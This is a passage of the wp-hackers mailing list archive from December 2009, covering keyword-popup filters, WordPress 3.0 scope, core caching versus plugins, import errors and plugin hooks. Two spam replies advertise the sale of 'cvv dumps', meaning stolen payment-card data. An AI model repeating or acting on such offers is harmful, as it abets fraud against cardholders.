Subject: [wp-hackers] any plugin for keyword hint database?
In-Reply-To: <9aa12a490912250751u54e7b71dped264d288fc76f3c@mail.gmail.com>
References: <9aa12a490912250751u54e7b71dped264d288fc76f3c@mail.gmail.com>
Message-ID: <349fe48b0912250802t919db0ew396ad6df2f01164@mail.gmail.com>

Just filter the content:


function keyword_popups($content) {
$list = array('
'foobar' => 'Some text'
);

foreach ($list as $keyword => $text) {
$content = str_replace(
$keyword,
$keyword . ' [popup]' . $text . '[/popup]', // replace with actual shortcode
$content
);
}

return $content;
}
add_filter('the_content', 'keyword_popups', 1);


On Fri, Dec 25, 2009 at 5:51 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> First of all Merry Christhmas to everyone :) Let it be a start of
> everything good!
>
> What we'd like to have is a little popup on keyword mouseover. Right
> now we use tippy, it generally does the same, but one has to insert
> the text of the popup in a special shortcode along with the keyword.
> It is not a very flexible solution, since if we want to highlight the
> same keyword in different post, we got to repeat the whole procedure
> again. Is there any established solution or plugin, which has all
> popup text vs keyword associations stored in one centralized place and
> automatically inserts these in post content, where necessary? It would
> be logical to store popup texts as custom post types for example, or
> just posts from special category.
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From jane at automattic.com  Fri Dec 25 17:09:56 2009
From: jane at automattic.com (Jane Wells)
Date: Fri, 25 Dec 2009 12:09:56 -0500
Subject: [wp-hackers] Scope for 3.0
Message-ID: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>

Hi everyone.

I wrote a post for dev blog per last dev chat about setting scope for  
3.0: http://wordpress.org/development/2009/12/setting-scope/

Also created a forum thread to start the discussion of which features  
might be worth putting in 3.0. http://wordpress.org/support/topic/345127

If we can keep the discussion about 3.0 scope there instead of  
splitting it between there and the list, that will make it easier to  
keep track of public opinion and start the new year off with a good  
understanding of which features have the most support.

Merry Christmas!

Jane

From zamoose at gmail.com  Fri Dec 25 18:32:36 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Fri, 25 Dec 2009 13:32:36 -0500
Subject: [wp-hackers] Scope for 3.0
In-Reply-To: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
Message-ID: <53553AAA-270D-4FF9-9EE0-D056EF3464AD@gmail.com>

Good post, but you missed an ideal opportunity to make a pun involving  
submarines and "scope depth".

*grin*

--
Doug Stewart

On Dec 25, 2009, at 12:09 PM, Jane Wells <jane at automattic.com> wrote:

> Hi everyone.
>
> I wrote a post for dev blog per last dev chat about setting scope  
> for 3.0: http://wordpress.org/development/2009/12/setting-scope/
>
> Also created a forum thread to start the discussion of which  
> features might be worth putting in 3.0. http://wordpress.org/support/topic/345127
>
> If we can keep the discussion about 3.0 scope there instead of  
> splitting it between there and the list, that will make it easier to  
> keep track of public opinion and start the new year off with a good  
> understanding of which features have the most support.
>
> Merry Christmas!
>
> Jane
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From wp at twolanedesign.com  Sun Dec 27 03:40:50 2009
From: wp at twolanedesign.com (Micah)
Date: Sat, 26 Dec 2009 19:40:50 -0800
Subject: [wp-hackers] compression and caching
In-Reply-To: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
Message-ID: <F757D2872564421698C9096F7A252858@Asuh>

I currently manage 30+ WP websites, a few of which have tons of content and 
plugins. While trying to optimize those sites that have a lot of requests, I 
researched best practices for websites. Many sites recommended the use of 
great plugins like Super Cache and Total Cache, which of course I do. But it 
made me wonder why compression and caching isn't included in the core.

My understanding is mostly superficial but it seems the inclusion of 
compression and caching options (turned off by default) would do a lot of 
positive for Wordpress and the end user experience. Static admin CSS and JS 
and TinyMCE files are minified and gzipped which is a great start to this.

As stated in this ticket, Gzip was taken out in version 2.5.
http://core.trac.wordpress.org/ticket/10365

If there was a way for compression to happen either server level or 
externally (using YUI Compressor), could there no be a switch or small 
system for enabling compression to be served as cached files? 


From wp at andrewnacin.com  Sun Dec 27 04:03:23 2009
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 26 Dec 2009 23:03:23 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <F757D2872564421698C9096F7A252858@Asuh>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com> 
	<F757D2872564421698C9096F7A252858@Asuh>
Message-ID: <4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>

For reference, this all started here:
http://core.trac.wordpress.org/ticket/11453

> But it made me wonder why compression and caching isn't included in the
core.

These require a well-configured server, hence why WordPress leaves it to a
combination of plugins and, frankly, a well-configured server.

From wp at twolanedesign.com  Sun Dec 27 04:31:52 2009
From: wp at twolanedesign.com (Micah)
Date: Sat, 26 Dec 2009 20:31:52 -0800
Subject: [wp-hackers] compression and caching
In-Reply-To: <4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
Message-ID: <2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>

>> But it made me wonder why compression and caching isn't included in the
> core.
>
> These require a well-configured server, hence why WordPress leaves it to a
> combination of plugins and, frankly, a well-configured server.

I could see this argument stand if compression was ongoing, on the fly, or 
in large amounts. Compression doesn't and shouldn't happen continuously, and 
cached files are stored and served up as needed. In theory, compression 
actually saves CPU load, reduces http/php request sizes and would save 
bandwidth handled by a server. 


From wordpress at dd32.id.au  Sun Dec 27 04:42:07 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 27 Dec 2009 15:42:07 +1100
Subject: [wp-hackers] compression and caching
In-Reply-To: <2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>
Message-ID: <op.u5kx0hw2spxmuu@dd32>

On Sun, 27 Dec 2009 15:31:52 +1100, Micah <wp at twolanedesign.com> wrote:

>>> But it made me wonder why compression and caching isn't included in the
>> core.
>>
>> These require a well-configured server, hence why WordPress leaves it  
>> to a
>> combination of plugins and, frankly, a well-configured server.
>
> I could see this argument stand if compression was ongoing, on the fly,  
> or
> in large amounts. Compression doesn't and shouldn't happen continuously,  
> and
> cached files are stored and served up as needed. In theory, compression
> actually saves CPU load, reduces http/php request sizes and would save
> bandwidth handled by a server.

You need to seperate Compression and Caching here.

Compression does not reduce CPU Load, Caching does.

There are Many *good* caching plugins for WordPress, But none of them can  
deal with a often changing Dynamic website AFAIK, And none of them belong  
in core in my opinion as they're better suited to running as plugins.

WordPress removed Compression in 2.5 as it was a buggy function, It didnt  
work on some servers due to double-compression, and some users couldnt  
understand that. In addition, It didnt do caching, so it would increase  
server load and subsequently, load times.








-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From wp at twolanedesign.com  Sun Dec 27 06:26:43 2009
From: wp at twolanedesign.com (Micah)
Date: Sat, 26 Dec 2009 22:26:43 -0800
Subject: [wp-hackers] compression and caching
In-Reply-To: <op.u5kx0hw2spxmuu@dd32>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com><F757D2872564421698C9096F7A252858@Asuh><4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com><2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>
	<op.u5kx0hw2spxmuu@dd32>
Message-ID: <6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>

> Compression does not reduce CPU Load, Caching does.

Compression is a means to an end for more efficient CPU load and faster page 
speeds using caching. That's how I was relating it.

> There are Many *good* caching plugins for WordPress, But none of them can 
> deal with a often changing Dynamic website AFAIK,

I'm not sure I follow.

> And none of them belong  in core in my opinion as they're better suited to 
> running as plugins.

I agree that there are a lot of good caching plugins but the fact that 
caching is enabled only through plugins goes against speeding things up even 
if in practice it is a small effect. 


From jayarjo at gmail.com  Sun Dec 27 09:34:46 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 27 Dec 2009 13:34:46 +0400
Subject: [wp-hackers] Import Error: Remote file error: Remote file returned
	error response 301 Moved Permanently
Message-ID: <9aa12a490912270134s78ff7b4w594e9276e5f2dda1@mail.gmail.com>

I did import several times without problems and then suddenly got this
error: Remote file error: Remote file returned error response 301
Moved Permanently on every image import script tried to download as
attachment from remote website.

Then after googling I found this post:
http://www.gabrielserafini.com/archives/2009/12/02/how-to-fix-301-error-when-importing-blog-posts-including-images-from-a-wordpress-com-blog-into-a-new-wordpress-org-blog/,
which says that it's a bug in wp 2.8.6 import script. Is it? Is it
fixed in 2.9?

-- 
Davit Barbakadze

From wordpress at dd32.id.au  Sun Dec 27 10:03:59 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 27 Dec 2009 21:03:59 +1100
Subject: [wp-hackers] Import Error: Remote file error: Remote file
 returned error response 301 Moved Permanently
In-Reply-To: <9aa12a490912270134s78ff7b4w594e9276e5f2dda1@mail.gmail.com>
References: <9aa12a490912270134s78ff7b4w594e9276e5f2dda1@mail.gmail.com>
Message-ID: <op.u5lcwxeqspxmuu@dd32>

If its an error, I dont think it was ever reported to Trac.. So it wouldnt  
be "fixed".

The function in question certainly seems to have the same content as 2.8  
too.

I'll have a look at it now, and see if i can reproduce it.. If your export  
is small enough, and doesnt contain any personal info, would you mind if i  
got a copy for testing?

On Sun, 27 Dec 2009 20:34:46 +1100, Davit Barbakadze <jayarjo at gmail.com>  
wrote:

> I did import several times without problems and then suddenly got this
> error: Remote file error: Remote file returned error response 301
> Moved Permanently on every image import script tried to download as
> attachment from remote website.
>
> Then after googling I found this post:
> http://www.gabrielserafini.com/archives/2009/12/02/how-to-fix-301-error-when-importing-blog-posts-including-images-from-a-wordpress-com-blog-into-a-new-wordpress-org-blog/,
> which says that it's a bug in wp 2.8.6 import script. Is it? Is it
> fixed in 2.9?
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From jayarjo at gmail.com  Sun Dec 27 12:45:06 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 27 Dec 2009 16:45:06 +0400
Subject: [wp-hackers] Import Error: Remote file error: Remote file
	returned error response 301 Moved Permanently
In-Reply-To: <op.u5lcwxeqspxmuu@dd32>
References: <9aa12a490912270134s78ff7b4w594e9276e5f2dda1@mail.gmail.com>
	<op.u5lcwxeqspxmuu@dd32>
Message-ID: <9aa12a490912270445r503be7e0qd7fe13a85e8ffaf8@mail.gmail.com>

It's around seven and half mb (xml), thousands of posts, would you
like to use it?

I did what this guy suggested in the post I quoted and import
procedure went smoothly.

On Sun, Dec 27, 2009 at 2:03 PM, Dion Hulse (dd32) <wordpress at dd32.id.au> wrote:
> If its an error, I dont think it was ever reported to Trac.. So it wouldnt
> be "fixed".
>
> The function in question certainly seems to have the same content as 2.8
> too.
>
> I'll have a look at it now, and see if i can reproduce it.. If your export
> is small enough, and doesnt contain any personal info, would you mind if i
> got a copy for testing?
>
> On Sun, 27 Dec 2009 20:34:46 +1100, Davit Barbakadze <jayarjo at gmail.com>
> wrote:
>
>> I did import several times without problems and then suddenly got this
>> error: Remote file error: Remote file returned error response 301
>> Moved Permanently on every image import script tried to download as
>> attachment from remote website.
>>
>> Then after googling I found this post:
>>
>> http://www.gabrielserafini.com/archives/2009/12/02/how-to-fix-301-error-when-importing-blog-posts-including-images-from-a-wordpress-com-blog-into-a-new-wordpress-org-blog/,
>> which says that it's a bug in wp 2.8.6 import script. Is it? Is it
>> fixed in 2.9?
>>
>
>
> --
> Using Opera's revolutionary e-mail client: http://www.opera.com/mail/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From ravi-lists at g8o.net  Sun Dec 27 16:24:42 2009
From: ravi-lists at g8o.net (Ravi Narayan Sarma)
Date: Sun, 27 Dec 2009 11:24:42 -0500
Subject: [wp-hackers] Extending comment filter in comments admin
In-Reply-To: <9D6A001F-B410-42E7-B8E4-E71C9A21D8A4@newclarity.net>
References: <46BB4884-0BDE-4928-BE78-19DE0A7EE634@g8o.net>
	<9D6A001F-B410-42E7-B8E4-E71C9A21D8A4@newclarity.net>
Message-ID: <5EA121EE-C7AF-4166-8E70-0D0C45F97B2C@g8o.net>

On Dec 24, 2009, at 7:19 PM, Mike Schinkel wrote:
> Sounds like a great plugin Ravi, hope you can get it working.
> 

Thank you Mike. I am done with my first cut of the plugin. While I waited for the plugin approval process, I also managed to code in some of the features mentioned below. Currently the plugin does the following:

* Adds options to the Comments Admin page, for each comment, to mark it as Todo, Replied, or Ignore.

* Comment blocks are given a background colour based on their state (default = Todo).

* Comments with a response from the post author are background coloured (light blue right now) to indicate that. Soon there will be an option to bulk mark all such comments as ?Replied?.

* Comments by post authors are automatically coloured ?ignored? (though not marked so).

* When new comments are added their parent (if any) is marked as responded if the response is by the post author. Currently this happens even if the original comment is by post author himself (i.e., author responding to himself ;-)), which perhaps should not be the case.

* A bulk mark option/link in the plugin admin page lets you mark existing comments as responded to by author (background colour = light blue) ? this has to be used with care of course, in case your blog has thousands of comments. Mine has hundreds and that went through pretty quick.

I have to say, where it is clear/documented/available, the WP filter/action mechanism is a splendid mechanism to inject code. All of the above functionality was achieved in less than 400 lines of code (include CSS, JavaScript, comments and blank lines). Admittedly this is plugin is a 0.8 release so its not fully fleshed out. Nonetheless, that?s a great API for developers.

Another thing: as I went about my effort, I fixed (or so I believe) a few issues in the Codex (e.g: the second arg to wp_comment() was marked as required, though the code suggests its optional). A question regarding the Codex (fodder for the wp-docs list if one exists?) ? are Discussion/Talk pages used much in practise? I left a comment on the Discussion page for one of the Codex pages, so I want to make sure it catches some responsible person?s attention.

	?ravi



> Happy Holidays hackers!
> 
> -Mike
> 
> On Dec 24, 2009, at 7:06 PM, Ravi Narayan Sarma wrote:
> 
>> Hello all,
>> 
>> so I have been struggling along with my ?comment response tracker? plugin; the plan is: in the comments admin page (edit-comments.php) I offer a few options to let the user mark a comment as ?todo?, ?replied? or ?ignore?. Comments that are ?todo? are displayed with some sort of background colouring. Also, the current response status is highlighted among the three choices. That?s all been hacked up to the best of my abilities.
>> 
>> Now, I figured, wouldn?t it be sweet to let the user ?Filter? comments by the response status? Turns out there is a convenient hook ?admin_comment_types_dropdown? that lets me extend the filter options offered to the user. The current set of options (?Comments?, ?Pings?) is passed down to me and I add in ?Todo?, ?Replied?, ?Ignored? to this list. So far so good. But the next step has me stymied. It seems that _wp_get_comment_list() is where the the status criteria is applied, but there seems to be no hook to influence this process. But then, why would there be an ?admin_comment_types_dropdown? hook? Perhaps I am looking in the wrong place.
>> 
>> Well, how about another direction? also available is a ?manage_comments_nav? action to extend this menu. Akismet uses this to add a ?Check for Spam? button. Should I perhaps be following suit, and extend the menu to offer my filtering options, rather than extend the Filter options?
>> 
>> Any suggestions would help alleviate my OCD!
>> 
>> 	? ravi


From wordpress at santosj.name  Sun Dec 27 20:03:43 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Sun, 27 Dec 2009 14:03:43 -0600
Subject: [wp-hackers] compression and caching
In-Reply-To: <6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com><F757D2872564421698C9096F7A252858@Asuh><4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com><2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>	<op.u5kx0hw2spxmuu@dd32>
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
Message-ID: <4B37BD9F.1010400@santosj.name>

The problem with what you propose is putting a solution where it does 
not belong and increases the overhead overall. The server solutions, 
while not available to everyone are better. With caching and compression 
there are many solutions, some better than others and no one solution 
will rule all for everyone. It is the reason there are plugins that 
handle this. Not everyone can dig into Apache and command it, so plugins 
are great for dealing with those people.

More below:

>> There are Many *good* caching plugins for WordPress, But none of them 
>> can deal with a often changing Dynamic website AFAIK,
>
> I'm not sure I follow.

When you cache a dynamic web site, lets say you have randomized ads. As 
soon as you cache the location of the ads, the placement is set until 
the cached page expires and is regenerated and thus regenerates the 
page. Now, we can talk about all kinds of caching that deals with this, 
but I believe we are talking about HTML page caching which does not 
(JavaScript loading in those dynamic regions is a workaround for this).

I mean this just furthers the point that caching isn't just as simple as 
flipping a switch and when you include one kind of caching, you 
eventually will have to include the rest. When you add this to core, 
then well, while it would be better than some image editing feature or 
another bloating feature, it will still require maintenance and the 
people willing to extend and maintain all of the different gotchas that 
come up. The problem in WordPress could have been fixed many different 
ways, but after being "Fixed" so many times, I think the decision to 
remove it was a good one.

>> And none of them belong  in core in my opinion as they're better 
>> suited to running as plugins.
>
> I agree that there are a lot of good caching plugins but the fact that 
> caching is enabled only through plugins goes against speeding things 
> up even if in practice it is a small effect. 

You either didn't fully explain your position and aren't giving an 
accurate and full account of what you are talking about or you don't 
know what you are talking about or think you do and don't. Let me 
educate you.

There are many solutions for caching: Database SQL caching, variable 
caching (APC, Xcache, Memcache, etc), partial HTML caching, full HTML 
caching, Apache Caching, PHP opcode caching, PHP caching (through 
extension), and probably a few more.

It only takes three to six lines in the MySQL my.cnf file to increase 
the default SQL caching (on dedicated or virtual dedicated with a lot of 
memory) to increase SQL caching. Since most of the time it is the 
database that has the most overhead in a PHP script, increasing this 
will go further than anything done in PHP. For other sites that get even 
more traffic PHP opcode caching should be used and for those that have 
it and for code that can't be optimized or takes a long time regardless, 
PHP variable caching or memcaching is better.

Just turning on full HTML caching will screw those with NFS filesystems 
and those with highly dynamic elements on their web sites.

Jacob Santos

From mikeschinkel at newclarity.net  Mon Dec 28 01:19:47 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 27 Dec 2009 20:19:47 -0500
Subject: [wp-hackers] WebIDE supporting WordPress? (based on IntelliJ)
Message-ID: <BF1B2A87-79AE-4B39-85FC-818806430670@newclarity.net>

Hey all,

I've been on Windows for years and found PhpEd to be an incredibly great PHP editor+debugger (for all you on Windows, check it out.)  I recently switched to Mac (and am still on the fence over which is better) but I've been looking for a replacement for PhpEd on Windows. 

I've really wanted an IDE vs. a text editor as I prefer a full debugger so TextMade and Espresso just didn't make the cut. I've not looked at Eclipse because everyone tells me it's so slow and bloated but I did look at Aptana, NetBeans and Komodo.  Unfortunately Aptana was way bloated and slow, NetBeans was also boated and slow, especially during debugging and I could never get it to work properly, and Komodo while good was not great and for US$299 I just couldn't get myself to consider it.

Anyway, someone on Twitter suggested IntelliJ and after looking around I found a beta project they are working to release in early 2010 called WebIDE.  I've been using it for about a week and it is surprisingly solid for a beta (I've had no crashes with it) and if you can ignore some of their ideology that means they don't support "New" in the file menu, have no "Save As" option, and don't support a simple "File Rename" (it must be done as a refactored rename) it's feature set is really, really good.

You can learn more about it here:

	http://blogs.jetbrains.com/idea/2009/08/web-ide-?-intellij-idea-for-html-and-php-developers/

You can download the "early access program" version here to try it out:

	http://www.jetbrains.net/confluence/display/WI/Web+IDE+EAP

What's even better, from what I've seen I think there's a good chance it's an IDE that could recognize and support refactoring for the WordPress "hook" system.  I've submitted a feature request to this effect and if you agree it would be great to have an IDE that recognized the WordPress hook system then please go vote up this feature request: 

http://youtrack.jetbrains.net/issue/WI-852

My hope is to show JetBrains that the WordPress developer community could be a huge market for them.

-Mike Schinkel
P.S. My only real hope is they price WebIDE when released at no more than US$149 and better at US$99.

From otto at ottodestruct.com  Mon Dec 28 14:39:58 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 28 Dec 2009 08:39:58 -0600
Subject: [wp-hackers] compression and caching
In-Reply-To: <6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com> 
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com> 
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh> <op.u5kx0hw2spxmuu@dd32> 
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
Message-ID: <161617690912280639v28c8393aj59a02960e31a2b00@mail.gmail.com>

On Sun, Dec 27, 2009 at 12:26 AM, Micah <wp at twolanedesign.com> wrote:
> Compression is a means to an end for more efficient CPU load and faster page
> speeds using caching. That's how I was relating it.

Except that it's not always faster or more efficient. Everything
depends on the specific configuration involved.

In particular, what if your server isn't storing the filesystem
locally? If your filesystem is network mounted (NFS), then it's quite
possible for a file-based caching solution to be slower to the point
that it actually bogs down your network.

You can't make any blanket statements about what's "better", because
that depends entirely on the configuration of your particular system.


> I agree that there are a lot of good caching plugins but the fact that
> caching is enabled only through plugins goes against speeding things up even
> if in practice it is a small effect.

Plugins are not automatically slower than non-plugins. It's all just
code. It doesn't magically get any faster by being in the core.

-Otto

From chris at clwill.com  Mon Dec 28 16:57:14 2009
From: chris at clwill.com (Chris Williams)
Date: Mon, 28 Dec 2009 11:57:14 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <161617690912280639v28c8393aj59a02960e31a2b00@mail.gmail.com>
Message-ID: <C75E236A.57A2%chris@clwill.com>

I can't tell you how many times I've had this discussion.  A plug-in involves so little extra code to get there...


________________________________
From: Otto <otto at ottodestruct.com>
Subject: Re: [wp-hackers] compression and caching

Plugins are not automatically slower than non-plugins. It's all just
code. It doesn't magically get any faster by being in the core.

From blaiserino at gmail.com  Mon Dec 28 18:00:59 2009
From: blaiserino at gmail.com (kwalock blaise)
Date: Mon, 28 Dec 2009 19:00:59 +0100
Subject: [wp-hackers] compression and caching
In-Reply-To: <C75E236A.57A2%chris@clwill.com>
References: <161617690912280639v28c8393aj59a02960e31a2b00@mail.gmail.com>
	<C75E236A.57A2%chris@clwill.com>
Message-ID: <c81652ed0912281000l1b3a1903l361d03d40b70ebe2@mail.gmail.com>

i sell cvv dumps banks longims

2009/12/28 Chris Williams <chris at clwill.com>

> I can't tell you how many times I've had this discussion.  A plug-in
> involves so little extra code to get there...
>
>
> ________________________________
> From: Otto <otto at ottodestruct.com>
> Subject: Re: [wp-hackers] compression and caching
>
> Plugins are not automatically slower than non-plugins. It's all just
> code. It doesn't magically get any faster by being in the core.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Hope To Read From You

From blaiserino at gmail.com  Mon Dec 28 18:01:22 2009
From: blaiserino at gmail.com (kwalock blaise)
Date: Mon, 28 Dec 2009 19:01:22 +0100
Subject: [wp-hackers] compression and caching
In-Reply-To: <161617690912280639v28c8393aj59a02960e31a2b00@mail.gmail.com>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com>
	<F757D2872564421698C9096F7A252858@Asuh>
	<4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com>
	<2C0D92D90D2E42D6BC94BD5B7B555292@Asuh> <op.u5kx0hw2spxmuu@dd32>
	<6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
	<161617690912280639v28c8393aj59a02960e31a2b00@mail.gmail.com>
Message-ID: <c81652ed0912281001s51932805pcee8739d581998c8@mail.gmail.com>

i sell cvv dumps banks longims

2009/12/28 Otto <otto at ottodestruct.com>

> On Sun, Dec 27, 2009 at 12:26 AM, Micah <wp at twolanedesign.com> wrote:
> > Compression is a means to an end for more efficient CPU load and faster
> page
> > speeds using caching. That's how I was relating it.
>
> Except that it's not always faster or more efficient. Everything
> depends on the specific configuration involved.
>
> In particular, what if your server isn't storing the filesystem
> locally? If your filesystem is network mounted (NFS), then it's quite
> possible for a file-based caching solution to be slower to the point
> that it actually bogs down your network.
>
> You can't make any blanket statements about what's "better", because
> that depends entirely on the configuration of your particular system.
>
>
> > I agree that there are a lot of good caching plugins but the fact that
> > caching is enabled only through plugins goes against speeding things up
> even
> > if in practice it is a small effect.
>
> Plugins are not automatically slower than non-plugins. It's all just
> code. It doesn't magically get any faster by being in the core.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Hope To Read From You

From wp at dan-cole.com  Mon Dec 28 20:31:46 2009
From: wp at dan-cole.com (Dan Cole)
Date: Mon, 28 Dec 2009 14:31:46 -0600
Subject: [wp-hackers] Improving WordPress Core Development
Message-ID: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>

I'm looking into the development of WordPress releases and would like to get
the thoughts of people who are the main developers and contributes, or
really anyone that contributes in Trac. How would you like to see the
development of WordPress and the release schedule improved? What
organizational changes can be done to make the process smoother and more
efficient?

What does everyone think about adding a  Release Schedule Methodology, a
Feature Freeze Policy, and a Feature and Enhancement Inclusion Policy.
Basically these would limit when feature and enhancement requests would make
it into a release and the latest the patch could be commit. These types of
things are found in other open source projects, such as the Fedora
distribution for Linux, and help them stay organized, stabilize the scope of
a release, and make the development progression more transparent to the
community. For WordPress it would help reduce the number of bugs late in
development and would keep the release on schedule. I think these three
things are right in-line with Jane's post titled "Setting Scope" and are not
meant to discourage development.

Dan Cole

From wp at twolanedesign.com  Mon Dec 28 20:34:25 2009
From: wp at twolanedesign.com (Micah)
Date: Mon, 28 Dec 2009 12:34:25 -0800
Subject: [wp-hackers] compression and caching
In-Reply-To: <4B37BD9F.1010400@santosj.name>
References: <9861424E-B8AB-4994-A475-4ABE7385A56D@automattic.com><F757D2872564421698C9096F7A252858@Asuh><4cc4de140912262003o4b6c0608nfb95a9949b3518b4@mail.gmail.com><2C0D92D90D2E42D6BC94BD5B7B555292@Asuh>	<op.u5kx0hw2spxmuu@dd32><6A411CFA7F4248A3A4611893FB9FBD5C@Asuh>
	<4B37BD9F.1010400@santosj.name>
Message-ID: <60C359174B6241E783E99EECC3A2EB6B@Asuh>

Bear with me while I attempt to satisfy replys all around. I realize how 
complicated this issue is but I don't think it's as black and white as 
either include it or not include it.

> With caching and compression there are many solutions, some better than 
> others and no one solution will rule all for everyone. It is the reason 
> there are plugins that handle this. Not everyone can dig into Apache and 
> command it, so plugins are great for dealing with those people.

So this is the root argument against integration into Wordpress. Not 
everyone does everything the same way and most people don't need to learn 
Apache in order to use compression when plugins are created for this 
purpose. I get it but I don't agree.

Compression can't be turned on by default. Bad idea. However, providing the 
option to a) include mod_rewrite into .htaccess or b) php compression give 
immediate options to those who do need them. While I'm about to make a huge 
assumption, I think the majority of Wordpress installations are standard, 
shared server installations. Compression *can* be used in these 
installations but not always in the same way. While simple blogs rarely need 
major compression, the rise of Wordpress as a CMS should put light on 
creating a better end user experience out of the box, not just with a lot of 
plugins.

> When you add this to core, then well, while it would be better than some 
> image editing feature or another bloating feature, it will still require 
> maintenance and the people willing to extend and maintain all of the 
> different gotchas that come up.

Isn't maintaining the gotchas what already happens to WP Super Cache 
support? It seems logical that since the core developers can control all 
aspects of the hows and whats about caching a dynamic system, knowing how 
brilliant you people are already, I don't think this problem gets much worse 
in the core. I agree that adding caching to the core would be better than 
more bloat and that's why I'm one man getting attention of many others.

> In particular, what if your server isn't storing the filesystem
> locally? If your filesystem is network mounted (NFS), then it's quite
> possible for a file-based caching solution to be slower to the point
> that it actually bogs down your network.
>
> You can't make any blanket statements about what's "better", because
> that depends entirely on the configuration of your particular system.

Compression will always make a file smaller. Smaller file sizes means less 
bandwidth. Less bandwidth means faster page loads. This isn't blanket 
statement.

There are always going to be exceptions to the rules for systems that might 
not see the benefits of compression and caching.

> Plugins are not automatically slower than non-plugins. It's all just
> code. It doesn't magically get any faster by being in the core.

Plugins are third-party to the core software. Including these techniques 
into the core takes away the middle man of having to use a plugin. I'm not 
against plugins, I just think root functionality that helps end user 
experience shouldn't be dismissed as plugin material.

I know Wordpress is already complicated as it is. Adding tons of plugins 
further complicates this CMS and add more requests to slow it dwn. In the 
end, the CMS is a more efficient, dynamic way to publish a website and the 
end user experience can be improved immediately with core compression and 
caching functionality.

While I realize how many compression techniques and caching techniques exist 
and knowing that there are best case scenarios for one method versus the 
other, support for some of these methods already exist in the widely used WP 
Super Cache. Time and time again I see a top 10 list of the must have 
plugins for Wordpress and guess what's on there? WP Super Cache.

I realize these are complicated, subjective things to include in Wordpress 
since installations vary. I get that. My main argument goes into the fact 
that Wordpress is going to fall behind competition by not including these 
features in the core as so many others have. I certainly don't believe that 
one person's agenda should be the reason why this stuff is included and I'll 
bow out of this if it's really too complicated. But the fact that WP Super 
Cache gets it right for a huge amount of installations is case study proof 
that this can work. 


From photofantaisie at gmail.com  Mon Dec 28 20:39:42 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Mon, 28 Dec 2009 21:39:42 +0100
Subject: [wp-hackers] Adding fields to the post quick edit box
Message-ID: <9dd057850912281239w16131b47h80ad9066b5f4b3b@mail.gmail.com>

Hi all,

Seasons Greetings!

Can anyone point me in the direction of any online info about hooking into
quick_edit_custom_box? I want to add a field to the posts Quick Edit box,
but couldn't find anything on the Codex, or elsewhere for that matter (apart
from the source code).

Any pointers will be much appreciated.

Thanks!

Ade.

From otto at ottodestruct.com  Mon Dec 28 21:19:37 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 28 Dec 2009 15:19:37 -0600
Subject: [wp-hackers] compression and caching
